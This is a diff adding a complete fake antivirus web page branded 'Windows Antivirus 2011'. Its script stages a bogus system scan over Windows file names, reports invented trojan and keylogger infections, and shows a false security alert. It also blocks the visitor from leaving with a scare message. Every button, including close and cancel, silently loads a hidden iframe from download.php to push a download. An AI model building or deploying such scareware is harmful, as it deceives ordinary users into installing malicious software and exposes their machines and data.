@@ -1,0 +1,329 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="Content-Language" content="en">
+<title>Windows Antivirus 2011</title>
+<style media="screen" type="text/css">.root {
+ width: 100%;
+ height: 100%;
+}
+
+.backgroundOpacityLayer {
+ background-color: #000000;
+ position: absolute;
+ top: 0px;
+ left: 0px;
+ width: 100%;
+ height: 100%;
+ opacity: 0.75;
+ -moz-opacity: 0.75;
+ -khtml-opacity: 0.75;
+ filter: progid:DXImageTransform.Microsoft.Alpha( opacity = 75 );
+ z-index: 50;
+}
+
+.foregroundContentLayer {
+ position: absolute;
+ top: 0px;
+ left: 0px;
+}
+
+#loading {
+ position: absolute;
+ left: 45%;
+ top: 40%;
+ padding: 2px;
+ z-index: 20001;
+ height: auto;
+}
+
+#loading a {
+ color: #225588;
+}
+
+#loading .blog1 {
+ background: white;
+ color: #444;
+ font: bold 13px tahoma, arial, helvetica;
+ padding: 10px;
+ margin: 0;
+ height: auto;
+}
+
+#blog2 {
+ font: normal 10px arial, tahoma, sans-serif;
+}</style><style media="screen" type="text/css">@charset "windows-1251";div#imagesCssTestElement{width:2px;}div.backgroundOpacityLayer{display:none;}body{margin:0;padding:0;width:100%;height:100%;}html{height:100%;}.images_main{width:100%;height:100%;font-family:tahoma;font-size:1px;background:#fff;position:absolute;left:0;top:0;margin:0;}img{border:none;}.images_left{min-height:537px;height:100%;position:absolute;width:222px;background:#7190e0;z-index:1;}.images_spacer{width:1px;height:1px;font-size:1px;}.images_spacer15{width:1px;height:15px;font-size:1px;}.images_spacer53{width:1px;height:53px;font-size:1px;}.images_right{position:absolute;width:100%;min-width:572px;height:100%;margin-right:0;min-height:537px;top:0;overflow:auto;}.blog4 .left_icon_1,.blog4 .left_icon_2,.images_folder_1 b.icon,.images_folder_2 b.icon,.images_hdd_1 b.icon,.images_sec_1 b.icon,.cl_win_main .about b,.cl_infected_red b,b.threat{display:block;font-size:0;line-height:0;background-image:url(img4/icon_sprite.jpg);background-repeat:no-repeat;}b.threat{width:13px;height:16px;background-position:0 -160px;}.images_table,.images_scroll,.cl_win_main .about,.blog4,.cl_win_rightb,.cl_win_foot .downcornerl,.blog4 .images_top,.blog4 .images_bottom,.images_grad,b.del,.yellow_border .cornerup,.yellow_border .cornerd,.cl_win_foot .downcornerr{background-image:url(img4/main_sprite.jpg);background-repeat:no-repeat;}b.del{display:block;width:4px;height:20px;background-position:-513px -44px;}.cl_win_head .cornerr,.cl_win_head .cornerl,.cl_win_foot .downfon,.cl_win_head .fonup,.GridHead,.images_scroll_bg,.images_table_tr_1 td{background-image:url(img4/fill_sprite.gif);background-repeat:no-repeat;}
+.blog4{width:186px;background-position:-1457px 0;background-repeat:repeat-y;position:relative;margin-top:7px;margin-left:6px;font-size:11px;padding-top:28px;padding-bottom:13px;padding-left:10px;line-height:1.4;padding-right:10px;margin-top:15px;}.blog4 .left_icon_1{width:16px;height:64px;position:absolute;top:35px;left:13px;background-position:0 0;}.blog4 .left_icon_2{width:16px;height:88px;position:absolute;top:35px;left:13px;background-position:0 -72px;}.blog4 
+.images_top{position:absolute;left:0;top:0;background-position:-528px -20px;height:19px;width:192px;font-size:11px;font-weight:bold;font-family:tahoma;color:#345ab8;padding-left:14px;padding-top:4px;}
+.blog4 .images_bottom{position:absolute;left:0;bottom:0;background-position:-734px -20px;height:2px;width:206px;font-size:1px;}.blog3{position:relative;font-size:11px;font-family:tahoma;color:#345ab8;padding-left:24px;height:17px;padding-top:1px;cursor:pointer;margin-top:6px;width:150px;}.blog3 img{position:absolute;left:0;top:0;}.blog5{position:relative;margin-left:240px;margin-top:10px;font-size:11px;font-weight:bold;}.blog5 span{color:#e20101;}.images_grad{width:329px;height:1px;line-height:0;font-size:0;overflow:hidden;margin-top:5px;margin-left:225px;background-position:-513px -43px;}.images_folders{overflow:hidden;zoom:1;}.images_folder_1{width:130px;height:38px;padding-left:45px;padding-top:10px;font-size:11px;left:250px;margin-top:15px;position:relative;float:left;}
+.blog{height:16px;padding-left:20px;margin-top:5px;font-size:11px;font-weight:bold;color:#de0000;padding-top:2px;visibility:hidden;position:relative;}
+.blog b{top:0;left:0;position:absolute;}.images_folder_2{width:140px;height:38px;padding-left:45px;padding-top:10px;font-size:11px;left:320px;margin-top:15px;position:relative;float:left;}.images_folder_1 b.icon,.images_folder_2 b.icon{width:37px;height:36px;background-position:-16px 0;position:absolute;top:0;left:0;}.images_hdd_1{width:150px;height:38px;padding-left:55px;padding-top:5px;font-size:11px;margin-left:245px;margin-top:10px;position:relative;}.images_hdd_1 b.icon{width:48px;height:26px;background-position:-16px -36px;position:absolute;top:0;left:0;}.images_sec_1{width:250px;height:38px;padding-left:55px;padding-top:10px;font-size:11px;margin-left:245px;margin-top:10px;position:relative;}.images_sec_1 b.icon{width:39px;height:48px;background-position:-16px -62px;position:absolute;top:0;left:0;}.community{height:14px;margin-top:5px;font-size:11px;font-weight:bold;color:#de0000;padding-top:2px;visibility:hidden;}.images_scroll{width:253px;height:17px;font-size:12px;font-weight:bold;background-position:-513px 0;margin-top:15px;margin-left:240px;padding-top:3px;padding-left:260px;position:relative;}.images_scroll span{position:relative;z-index:1;}.images_scroll_bg{position:absolute;left:5px;top:3px;width:0;height:15px;background-position:0 -111px;background-repeat:repeat-x;z-index:0;}.images_table{width:513px;height:211px;background-position:0 0;position:relative;margin-top:15px;margin-left:240px;visibility:hidden;}.blog6{margin-left:245px;font-size:11px;color:#4b4b4b;margin-top:2px;}.images_inner_table{width:480px;margin-left:15px;margin-top:48px;}.images_table_tr_1 td{background-position:0 -126px;background-repeat:repeat-x;font-family:verdana;font-size:11px;padding-left:8px;}.images_inner_table_cont{width:480px;margin-left:15px;height:97px;overflow:auto;}.images_inner_table_2 td{height:18px;padding-left:5px;font-size:11px;}.images_table_text{font-size:16px;color:#FFF;position:absolute;left:43px;top:8px;}.images_recommend{position:absolute;left:18px;bottom:15px;font-size:11px;cursor:pointer;}.images_start{position:absolute;right:15px;bottom:10px;cursor:pointer;}.images_left_border{height:100%;position:absolute;z-index:3;width:3px;background:#0731d9;left:0;top:0;}.images_right_border{height:100%;position:absolute;z-index:3;width:3px;font-size:1px;background:#0731d9;right:0;top:0;}.images_bottom_border{width:100%;position:absolute;z-index:3;height:3px;font-size:1px;background:#0731d9;left:0;bottom:0;}.images_main_content{width:800px;height:600px;position:relative;}.images_table_divider{background:url(img4/table_divider.gif);}#divider1{width:4px;height:20px;background-position:0 0;}#divider2{width:4px;height:20px;background-position:0 0;}#cl_alert{font-family:tahoma;}#cl_main{width:436px;height:350px;background-position:0 -20px;position:relative;}.close{width:25px;height:25px;position:absolute;top:0;right:0;cursor:pointer;}.move{width:410px;height:25px;position:absolute;top:0;left:0;}.spacer{width:1px;height:1px;font-size:1px;}		.text1{position:relative;margin-top:50px;margin-left:60px;width:355px;font-family:Verdana,Geneva,sans-serif;font-size:11px;font-weight:bold;color:#FFF;}.cl_viruses{width:410px;position:absolute;height:103px;top:135px;left:11px;overflow:auto;}.virus{float:left;width:280px;padding-left:5px;font-family:Tahoma,Geneva,sans-serif;font-size:11px;color:#F00;font-weight:bold;}.virusname{font-size:11px;}.text2{bottom:10px;left:50px;width:365px;font-size:11px;font-family:Tahoma,Geneva,sans-serif;position:absolute;}.remove{position:absolute;left:220px;top:250px;width:93px;height:22px;cursor:pointer;}.cancel{position:absolute;left:332px;top:250px;width:93px;height:22px;cursor:pointer;}.virus_1_1{padding-left:18px;position:relative;height:17px;padding-top:3px;font-size:11px;font-family:tahoma;}.cl_alert{width:436px;height:350px;margin-left:auto;margin-right:auto;}</style></head><body>
+	
+
+<!--[if IE]>
+<style>
+.images_scroll{width:513px;height:20px;font-size:12px;font-weight:bold;background-position:-513px 0;margin-top:15px;margin-left:240px;padding-top:3px;padding-left:260px;position:relative;}
+.blog4{width:206px;background-position:-1457px 0;background-repeat:repeat-y;position:relative;margin-top:7px;margin-left:6px;font-size:11px;padding-top:28px;padding-bottom:13px;padding-left:10px;line-height:1.4;padding-right:10px;margin-top:15px;}.blog4 .left_icon_1{width:16px;height:64px;position:absolute;top:35px;left:13px;background-position:0 0;}.blog4 .left_icon_2{width:16px;height:88px;position:absolute;top:35px;left:13px;background-position:0 -72px;}.blog4 
+.images_top{position:absolute;left:0;top:0;background-position:-528px -20px;height:19px;width:206px;font-size:11px;font-weight:bold;font-family:tahoma;color:#345ab8;padding-left:14px;padding-top:4px;}
+.blog{width:120px;height:16px;padding-left:20px;margin-top:5px;font-size:11px;font-weight:bold;color:#de0000;padding-top:2px;visibility:hidden;position:relative;}
+.images_folder_1{width:135px;height:38px;padding-left:45px;padding-top:10px;font-size:11px;left:250px;margin-top:15px;position:relative;float:left;}
+</style>
+<![endif]-->
+
+<div id="loading" style="display:none;">
+<div class="blog1">
+<img style="margin-right: 8px; float: left; vertical-align: top;" src="img4/loading.gif" height="50" width="50"><br>
+<span id="blog2">Initializing Protection System...</span></div></div>
+
+<div id="content" style="display:none">
+
+<div id="images"><div class="images_main">	
+	<div class="images_left" id="images_left">
+		
+		<div class="blog4">
+ <div class="left_icon_1"></div>
+ <div class="images_spacer"></div>
+
+ 	<div class="images_top">System Tasks</div>
+ <div class="images_bottom"></div>
+			<div class="blog3" onclick="download();return false;">View system information</div>
+			<div class="blog3" onclick="download();return false;">Add or remove programs</div>
+			<div class="blog3" onclick="download();return false;">Change a settings</div>
+ </div>
+		<div class="blog4">
+
+ <div class="left_icon_2"></div>
+ <div class="images_spacer"></div>
+ 	<div class="images_top">Other Places</div>
+ <div class="images_bottom"></div>
+			<div class="blog3" onclick="download();return false;">My Network Places</div>
+			<div class="blog3" onclick="download();return false;">My Documents</div>
+			<div class="blog3" onclick="download();return false;">Shared Documents</div>
+
+			<div class="blog3" onclick="download();return false;">Control Panel</div>
+ </div>
+		<div class="blog4">
+ 	<div class="images_spacer"></div>
+ 	<div class="images_top">Details</div>
+ <div class="images_bottom"></div>
+			<strong>My Computer</strong><br>
+
+System Folder
+ </div>
+	</div>
+	
+	<div class="images_right">
+ 	
+		<div class="images_spacer"></div>
+		<div class="blog5">System folders<span id="blog5_alert"></span></div>
+		<div class="images_grad"></div>
+ <div class="images_folders">
+ <div class="images_folder_1">
+
+ <b class="icon"></b>
+ Shared Documents
+ <div style="visibility: hidden;" class="blog" id="blog"><b class="threat"></b><span id="123"></span>&nbsp;Viruses found</div>
+ </div>
+ <div class="images_folder_2">
+ <b class="icon"></b>
+ My Documents
+ <div style="visibility:hidden;" class="blog" id="community"><b class="threat"></b><span id="567"></span>&nbsp;Viruses found</div>
+
+ </div>
+ </div>
+ <div class="images_spacer"></div>
+		<div class="blog5">Hard drive<span id="blog5_alert"></span></div>
+		<div class="images_grad"></div>
+ <div class="images_hdd_1">
+ <b class="icon"></b>
+ Hard drive (C:)
+ <div style="visibility: hidden;" class="blog" id="forum"><b class="threat"></b><span id="345"></span>&nbsp;Viruses found</div>
+
+ </div>
+ <div class="blog5">Security<span id="blog5_alert"></span></div>
+		<div class="images_grad"></div>
+ <div style="background-position: 0px -566px;" class="images_sec_1" id="images_sec_1">
+ <b class="icon"></b>
+ Windows Security
+ <div style="visibility: visible;" class="community" id="community_1">Security is affected by virus</div>
+ </div>
+
+ <div class="images_scroll"><span id="images_scroll">100</span><span>%</span>
+ 	<div style="width:0px;" class="images_scroll_bg" id="images_scroll_bg"></div>
+ </div>
+ <div class="blog6" id="blog6_1">Checking: <span id="blog6"></span></div>
+ <div style="visibility: visible;" class="images_table" id="images_table">
+ 	<div class="images_table_text">Your Computer is infected</div>
+
+ 		<div class="images_spacer"></div>
+ 	<table class="images_inner_table" cellpadding="0" cellspacing="0">
+ 	<tbody><tr class="images_table_tr_1">
+ 	<td colspan="2" width="260">Name</td>
+ <td width="4"><b class="del"></b></td>
+ <td width="75">Type</td>
+ <td width="4"><b class="del"></b></td>
+ <td>Threat level</td>
+
+ </tr>
+ </tbody></table>
+ <div class="images_inner_table_cont" id="images_inner_table_cont">
+ <div class="images_spacer"></div>
+ 
+ <table cellpadding="0" cellspacing="0" class="images_inner_table_2" id="tablevir">
+ 	<tbody>
+ 		<tr>
+    		<td width="14" height="20">
+        	</td>
+    		<td width="288" height="20"></td>
+    		<td width="90" height="20"></td>
+    		<td width="86" height="20"></td>
+    	</tr>
+ 	</tbody>
+ </table>
+ 
+ </div>
+
+ <div class="images_recommend"><strong>Recommend:</strong> Click "Start Protection" button to erase all threats</div>
+ <div class="images_start"><form style="padding: 0pt; margin: 0pt; font-family: tahoma; font-size: 11px;"><input style="padding: 0pt; margin: 0pt; font-family: tahoma; font-size: 11px;" value="Start Protection" onclick="download();return false;" type="button" height="23" width="104"></form></div>
+ </div>
+	</div>
+ <div class="images_main_content"></div>
+</div></div>
+<div id="frame"></div>
+<div id="alert_window_0"><div style="z-index: 100; width: 1664px; height: 881px;" class="backgroundOpacityLayer"></div>
+
+<div align="center" style="z-index: 101; position: static; margin-top: 209px;" class="foregroundContentLayer">
+
+
+<div id="cl_alert" style="display:none;">
+	<div id="cl_main" class="images_table_divider" align="left">
+
+ 	<div class="close" onclick="download();return false;"></div>
+ <div class="move" onmousedown="download();return false;"></div>
+ <div class="spacer"></div>
+ <div class="text1">To help protect your computer, Windows Web Security have detected Trojans and ready to remove them.</div>
+ <div class="cl_viruses">
+ 	<div class="virus" id="viruses">
+ <div class="virus_1_1"><b class="threat" style="position: absolute; left: 0px; top: 2px;"></b>Adware.Win32.Winad</div><div class="virus_1_1"><b class="threat" style="position: absolute; left: 0px; top: 2px;"></b>W32.Yaha.B@mm</div><div class="virus_1_1"><b class="threat" style="position: absolute; left: 0px; top: 2px;"></b>Magic DVD Ripper</div><div class="virus_1_1"><b class="threat" style="position: absolute; left: 0px; top: 2px;"></b>Trojan-PSW.Win32.LdPinch.abm</div><div class="virus_1_1"><b class="threat" style="position: absolute; left: 0px; top: 2px;"></b>Trojan virtumonde</div><div class="virus_1_1"><b class="threat" style="position: absolute; left: 0px; top: 2px;"></b>Trojan.Fakealert.355</div><div class="virus_1_1"><b class="threat" style="position: absolute; left: 0px; top: 2px;"></b>Trojan.Qoologic - Key Logger</div><div class="virus_1_1"><b class="threat" style="position: absolute; left: 0px; top: 2px;"></b>Adware.Win32.Look2me.ab</div><div class="virus_1_1"><b class="threat" style="position: absolute; left: 0px; top: 2px;"></b>Trojan Horse IRC/Backdoor.SdBot4.FRV</div><div class="virus_1_1"><b class="threat" style="position: absolute; left: 0px; top: 2px;"></b>Win32/Hoax.Renos.HX</div></div>
+
+ <div class="virusname" id="hazardType">
+ <div class="virus_1_1">noise.dat</div><div class="virus_1_1">emptyregdb.dat</div><div class="virus_1_1">mpr.dll</div><div class="virus_1_1">ieakui.dll</div><div class="virus_1_1">SET3.tmp</div><div class="virus_1_1">country.sys</div><div class="virus_1_1">ahui.exe</div><div class="virus_1_1">popcinfo.dat</div><div class="virus_1_1">dsdmo.dll</div><div class="virus_1_1">Active Setup Log.txt</div></div>
+ 	
+ </div>
+ <div class="text2">Spyware is software, which can gather information from user's computer through Internet connection and send them to its creater. Gather information can be passwords, e-mail adresses and all that data, which is important for you.</div>
+
+ <div class="remove" onclick="download();return false;"></div>
+ <div class="cancel" onclick="download();return false;"></div>
+ </div>
+
+</div></div></div>
+</div>
+
+<script>window.onbeforeunload = function() { return 'Your system is at risk of crash... Press CANCEL to prevent it.'; };
+
+
+function download(){
+	document.getElementById('frame').innerHTML = '<iframe src="download.php?q=2" style="width: 0px; height: 0px; border: 0px none;"></iframe>';
+}
+function n3(id,i){
+	if (i==0){
+		document.getElementById(id).style.visibility = 'visible';
+		setTimeout('n3("'+id+'",1);',500);
+	}else if(i==1){
+		document.getElementById(id).style.visibility = 'hidden';
+		setTimeout('n3("'+id+'",0);',500);
+	}
+}
+
+function AddVir(text1,text2,text3){
+var x=document.getElementById('tablevir').insertRow(0);
+var y=x.insertCell(0);
+var z=x.insertCell(1);
+var zz=x.insertCell(2);
+var zzz=x.insertCell(3);
+y.innerHTML='<b class="threat"></b>';
+z.innerHTML=text1;
+zz.innerHTML=text2;
+zzz.innerHTML=text3;
+}
+function scan(i){
+	if (i<=503){
+		per = Math.round((i*100)/503);
+		document.getElementById('images_scroll_bg').style.width = i+'px';
+		document.getElementById('images_scroll').innerHTML = per;
+		
+		file = ["MSFDC.INF","MSFS.CNT","MSFS.HLP","MSFS32.DLL","MSFVW32.DLL","MSG721.ACM","MSGM32.ACM","MSGSRV32.EXE","MSHDC.INF","MSHEARTS.CNT","MSHEARTS.EXE","MSHEARTS.HLP","MSJSTICK.DRV","MSMAIL.INF","MSMIXMGR.DLL","MSMOUSE.INF","MSMOUSE.VXD","MSMPU401.DRV","MSMPU401.VXD","MSN.CNT","MSN.HLP","MSN.MSN","MSN.TXT","MSNBBS.HLP","MSNCHAT.HLP","MSNDUI.DLL","MSNET.DRV","MSNET32.DLL","MSNEXCH.EXE","MSNFIND.EXE","MSNFULL.HLP","MSNINT.HLP","MSNMAIL.HLP","MSNP32.DLL","MSNPSS.CNT","MSNPSS.HLP","MSNVER.TXT","MSODISUP.VXD","MSOPL.DRV","MSOPL.VXD","MSPAINT.CNT","MSPAINT.EXE","MSPAINT.HLP","MSPCIC.DLL","MSPORTS.INF","MSPP32.DLL","MSPST32.DLL","MSPWL32.DLL","MSRLE32.DLL","MSSBLST.DRV","MSSBLST.VXD","MSSHRUI.DLL","MSSNDSYS.DRV","MSSNDSYS.VXD","MSSOUND.WAV","MSSP.VXD","MSTCP.DLL","MSUCIARE.WAV","MSVCRT20.DLL","MSVID32.DLL","MSVIDEO.DLL","MSVIEWUT.DLL","MSWD6_32.WPC","MT_T1101.SPD","MTD.INF","MTLITE.DRV","MTMMINIP.MPD","MULTILNG.INF","MV1401.DRV","MV1514MX.DRV","MVCL14N.DLL","MVIFM.DRV","MVIFM.PAT","MVIWAVE.DRV","MVMIXER.DRV","MVPAS.VXD","MVPR14N.DLL","MVPROAUD.DRV","MVTTL14C..DLL","MVUT14N.DLL","N15210.DOS","N18510.DOS","N2090522.SPD","N2290520.SPD","N890_470.SPD","N890X505.SPD","NAL.DLL","NBSTAT.EXE","NCC16.DOS","NDDEAPI.DLL","NDDENB.DLL","NDIS.VXD","NDIS2SUP.VXD","NDIS30.DLL","NDIS39XR.DOS","NDIS89XR.DOS","NDISHLP.SYS","NE1000.DOS","NE1000.SYS","NE2000.DOS","NE2000.SYS","NE3200.BIN","NE3200.DOS","NE3200.SYS","NEC24PIN.DRV","NECATAPI.VXD","NET.EXE","NET.INF","NET.MSG","NET3COM.INF","NETAMD.INF","NETAPI.DLL","NETAPI32.DLL","NETAUXT.INF","NETBEUI.VXD","NETBIOS.DLL","NETBW.INF","NETCABLE.INF","NETCD.INF","NETCDA.INF","NETCEM.INF","NETCLI.INF","NETCLI.INF","NETCPL.CPL","NETCPQ.INF","NETDDE.EXE","NETDEC.INF","NETDEF.INF","NETDET.INI","NETDI.DLL","NETEE16.INF","NETEVX.INF","NETFLEX.INF","NETFLX.BIN","NETFLX.DOS","NETFLX.SYS","NETGEN.INF","NETH.MSG","NETHP.INF","NETIBM.INF","NETIBMCC.INF","NETMADGE.INF","NETMON.386","NETMON.INF","NETNCR.INF","NETNICE.INF","NETNOVEL.INF","NETOLI.INF","NETOS.INF","NETOSI.INF","NETPPP.INF","NETPROT.INF","NETRACAL.INF","NETSERVR.INF","NETSETUP.ADM","NETSETUP.DLL","NETSETUP.EXE","NETSETUP.INF","NETSETUP.LAY","NETSILC.INF","NETSMC.INF","NETSMC32.INF","NETSMCTR.INF","NETSNIP.INF","NETSOCK.INF","NETSTAT.EXE","NETSUSSRC.INF","NETTCC..INF","NETTDKP.INF","NETTRANS.INF","NETTULIP.INF","NETUB.INF","NetWare.MS","NETWATCH.CNT","NETWATCH.EXE","NETWATCH.HLP","NETWORK.HLP","NETWORK.TXT","NETXIR.INF","NETZNOTE.INF","NICE.VXD","NLSFUNC.EXE","NM95SETP.DLL","NMAGENT.EXE","NMAGENT.INF","NMSUPP4.386","NMTHUNK.DLL","NO_1.CUR","NO_2.CUR","NO_3.CUR","NO_4.CUR","NO_5.CUR","NO_L.CUR","NO_M.CUR","NODRIVER.INF","NOTEPAD.CNT","NOTEPAD.EXE","NOTEPAD.HLP","NSCL.VXD","NTDLL.DLL","NW16.DLL","NWAB32.DLL","NWLINK.VXD","NWLSCON.EXE","NWLSPROC.EXE","NWNBLINK.VXD","NWNET32.DLL","NWNP32.DLL","NWPP32.DLL","NWREDIR.VXD","NWRPLTRM.COM","NWSERVER.VXD","NWSP.VXD","OAK.VXD","OCTK16.SYS","OCTK32.VXD","ODIHLP.EXE","OK124.DRV","OK1830US.SPD","OK1840US.SPD","OK1850US.SPD","OK19.DRV","OK19IBM.DRV","OKOL8701.SPD","OL830525.SPD","OL840518.SPD","OL850525.SPD","OLE2.DLL","OLE2.INF","OLE2CONV.DLL","OLE2DISP.DLL","OLE2NLS.DLL","OLE32.DLL","OLEAUT32.DLL","OLECLI.DLL","OLECLI32.DLL","OLECNV32.DLL","OLEDLG.DLL","OLESRV.DLL","OLESRV32.DLL","OLETHK32.DLL","OLIDM24.DRV","OLIDM9.DRV","OLITOK.DOS","OLITOK16.DOS","ONLSTMT.EXE","ONLSTMT.HLP","P351SX2.DRV","P4455514.SPD","PA3DMXD.DRV","PACKAGER.EXE","PACKAGER.CNT","PACKAGER.HLP","PAGESWAP.VXD","PAINTJET.DRV","PANMAP.DLL","PANSON24.DRV","PANSON9.DRV","PAP54001.SPD","PAP54101.SPD","PARALINK.VXD","PARITY.VXD","PASSPORT.MID","PASSWORD.CPL","PBRUSH.EXE","PC2X.MPD","PCCARD.VXD","PCI.VXD","PCMCIA.INF","PCNTN3.VXD","PCNTND.DOS","PCSA.EXE","PE2NDIS.DOS","PE3NDIS.EXE","PE3NDIS.VXD","PEN_1.CUR","PEN_2.CUR","PEN_3.CUR","PEN_4.CUR","PEN_5.CUR","PEN_L.CUR","PEN_M.CUR","PENDIS.DOS","PERF.VXD","PHIIPX.SPD","PHONE.PBK","PIANO.ANI","PIFCONV.EXE","PIFMGR.DLL","PING.EXE","PJLMON.DLL","PKPD.DLL","PKPD32.DLL","PMSPL.DLL","POINTER.DLL","POINTER.EXE","POLEDIT.CNT","POLEDIT.EXE","POLEDIT.HLP","POLEDIT.INF","POWER.DRV","POWERCFG.DLL","POWRPNT.PPT","PPM.VXD","PPPMAC.VXD","PRECOPY.INF","PRESENTA.SHW","PRINT.EXE","PRINTER.TXT","PRO4.DOS","PRO4AT.DOS","PRODINV.DLL","PROGMAN.CNT","PROGMAN.EXE","PROGMAN.HLP","PROPRINT.DRV","PROPRN24.DRV","PRORAPM.DWN","PROTEON.VXD","PROTMAN.DOS","PROTMAN.EXE","PRTUPD.INF","PS1.DRV","PS4079.ICM","PSCRIPT.DRV","PSCRIPT.HLP","PSCRIPT.INI","PSMON.DLL","PSTRIPE.BMP","PYRAMID2.BMP","Q1C117.VXD","QBASIC.EXE","QBASIC.HLP","QCS1000.SPD","QCS10503.SPD","QCS30503.SPD","QM1700_1.SPD","QM200C_1.SPD","QM823MR1.SPD","QMPS4101.SPD","QMS10030.ICM","QMS1725.SPD","QMS3225.SPD","QMS420.SPD","QMS45252.SPD","QMS860.SPD","QMS8P461.SPD","QMSCS210.SPD","QMSCS230.SPD","QUATTRO.WB2","QUICKVIEW.EXE","QUIETJET.DRV","QWIII.DRV","QWMMFIX.VXD","RAINBOW.ANI","RAMDRIVE.SYS","RASAPI16.DLL","RASAPI32.DLL","RCV0000.EFX","README.TXT","REBOOT.VXD","REDBRICK.BMP","REDIR32.EXE","REDIRECT.MOD","REDTILE.BMP","REGEDIT.CNT","REGEDIT.EXE","REGEDIT.HLP","REGSERV.EXE","REGSRV.INF","REGWIZ.EXE","RESTORE.EXE","RICHED.DLL","RICHED32.DLL","RINGIN.WAV","RINGOUT.WAV","RIVETS.BMP","RIVETS2.BMP","RMM.PDR","RNA.INF","RNAAPP.EXE","RNAL.DLL","RNANP.DLL","RNAPLUS.INF","RNASERV.DLL","RNASETUP.DLL","RNATHUNK.DLL","RNAUI.DLL","RNDSRV32.DLL","ROMAN.FON","ROUTE.EXE","RPCLTC1.DLL","RPCTLC3.DLL","RPCTLC5.DLL","RPCTLC6.DLL","RPCTLS3.DLL","RPCTLS5.DLL","RPCTLS6.DLL","RPCNS4.DLL","RPCPP.DLL","RPCRT4.DLL","RPCSS.EXE","RPLBOOT.SYS","RPLIMAGE.DLL","RPLIMAGE.EXE","RSRC16.DLL","RSRC32.DLL","RSRCMTR.EXE","RSRCMTR.INF","RUMOR.EXE","RUNDLL.EXE","RUNDLL32.EXE","RUNONCE.EXE","S3.DRV","S3.VXD","SACLIENT.DLL","SAMPLE VIDEOS","SAND.BMP","SAPNSP.DLL","SAVE32.COM","SB16.VXD","SB16SND.DRV","SBAWE.VXD","SBAWE32.DRV","SBFM.DRV","SCANDISK.BAT","SCANDISK.EXE","SCANDISK.EXE","SCANDISK.INI","SCANDISK.PIF","SCANPROG.EXE","SCANPST.EXE","SCAPST.HLP","SCCVIEW.DLL","SCRNSAVE.SCR","SCSI.INF","SCSI1HLP.VXD","SCSIPORT.PDR","SECUR32.DLL","SECURCL.DLL","SEIKO24E.DRV","SEIKOSM9.DRV","SELECT.EXE","SERENUM.VXD","SERIAL.VXD","SERIALUI.DLL","SERIFE.FON","SERIFF.FON","SERMDIR.EXE","SERVER.HLP","SETUP.BIN","SETUP.BMP","SETUP.EXE","SETUP.INF","SETUP.TXT","SETUP4.DLL","SETUPPP.INF","SETUPX.DLL","SETUPX.DLL","SETVER.EXE","SF4029.EXE","SHARE.EXE","SHELL.DLL","SHELL.INF","SHELL.NEW","SHELL.VXD","SHELL2.INF","SHELL3.INF","SHELL32.DLL","SHSCRAP.DLL","SIGNUP.EXE","SIZENESW.ANI","SIZENS.ANI","SIZENWSE.ANI","SIZEWE.ANI","SKPSFA_1.SPD","SLAN.DOS","SLCD.MPD","SLENH.DLL","SMALLE.FON","SMALLF.FON","SMARTDRV.EXE","SMARTND.DOS","SMC_ARC.DOS","SMC3000.DOS","SMC8000.DOS","SMC8000W.VXD","SMC80PC.VXD","SMC8100.DOS","SMC8100W.VXD","SMC8232.DOS","SMC8232W.VXD","SMC9000.DOS","SMC9000.VXD","SNAPSHOT.EXE","SNAPSHOT.VXD","SNDREC32.EXE","SNDVOL32.CNT","SNDVOL32.EXE","SNDVOL32.HLP","SNIP.VXD","SNMP.EXE"];
+		
+		
+		document.getElementById('blog6').innerHTML = file[i];
+		
+		if (per==5){document.getElementById('123').innerHTML = '1';n3('blog',0);}
+		if (per==25){document.getElementById('123').innerHTML = '2';}
+		if (per==45){document.getElementById('123').innerHTML = '3';}
+		if (per==70){document.getElementById('123').innerHTML = '4';}
+		if (per==80){document.getElementById('123').innerHTML = '5';}
+		if (per==90){document.getElementById('123').innerHTML = '6';}
+		
+		if (per==5){document.getElementById('345').innerHTML = '1';n3('forum',0);}
+		if (per==15){document.getElementById('345').innerHTML = '2';}
+		if (per==35){document.getElementById('345').innerHTML = '3';}
+		if (per==55){document.getElementById('345').innerHTML = '5';}
+		if (per==70){document.getElementById('345').innerHTML = '8';}
+		if (per==80){document.getElementById('345').innerHTML = '11';}
+		
+		if (per==13){document.getElementById('567').innerHTML = '1';n3('community',0);}
+		if (per==30){document.getElementById('567').innerHTML = '2';}
+		if (per==60){document.getElementById('567').innerHTML = '4';}
+		if (per==80){document.getElementById('567').innerHTML = '7';}
+		
+		if (i==10){
+			AddVir("<strong>Adware.Win32.Winad</strong>",'virus','<strong><font color="#ff0000">Critical</font></strong>');
+		}else if (i==40){
+			AddVir("<strong>W32.Yaha.B@mm</strong>",'virus','<strong><font color="#ff0000">Critical</font></strong>');	
+		}else if (i==70){
+			AddVir("<strong>Magic DVD Ripper</strong>",'virus','<strong><font color="#ff0000">High</font></strong>');	
+		}else if (i==100){
+			AddVir("<strong>Trojan-PSW.Win32.LdPinch.abm</strong>",'virus','<strong><font color="#ff0000">Critical</font></strong>');	
+		}else if (i==130){
+			AddVir("<strong>Trojan virtumonde</strong>",'virus','<strong><font color="#ff0000">Critical</font></strong>');	
+		}else if (i==170){
+			AddVir("<strong>Trojan.Fakealert.355</strong>",'virus','<strong><font color="#ff0000">Medium</font></strong>');
+		}else if (i==200){
+			AddVir("<strong>Trojan.Qoologic - Key Logger</strong>",'virus','<strong><font color="#ff0000">High</font></strong>');
+		}else if (i==250){
+			AddVir("<strong>Adware.Win32.Look2me.ab</strong>",'virus','<strong><font color="#ff0000">Critical</font></strong>');
+		}else if (i==300){
+			AddVir("<strong>Trojan Horse IRC/Backdoor.SdBot4.FRV</strong>",'virus','<strong><font color="#ff0000">Medium</font></strong>');
+		}else if (i==400){
+			AddVir("<strong>Win32/Hoax.Renos.HX</strong>",'virus','<strong><font color="#ff0000">Medium</font></strong>');
+		}
+		
+		i=i+1;
+		setTimeout('scan('+i+');',18);
+	}else{
+		document.getElementById('cl_alert').style.display = 'block';	
+		document.getElementById('blog6').innerHTML = 'Complete Scan';
+		//download();
+	}
+}
+width = screen.width;
+height = screen.height;
+
+width1 = (width/2)-20;
+height1 = (height/2)-20;
+
+
+window.resizeTo(0,0);
+window.moveTo(width1,height1);
+
+alert('Windows Security 2011 has found critical process activity on your PC and will perform fast scan of system files.');
+
+document.getElementById('loading').style.display = 'none';
+document.getElementById('content').style.display = 'block';
+
+window.moveTo(0,0);
+window.resizeTo(screen.width,screen.height);
+scan(0);</script>
+
+</body>
+</html>
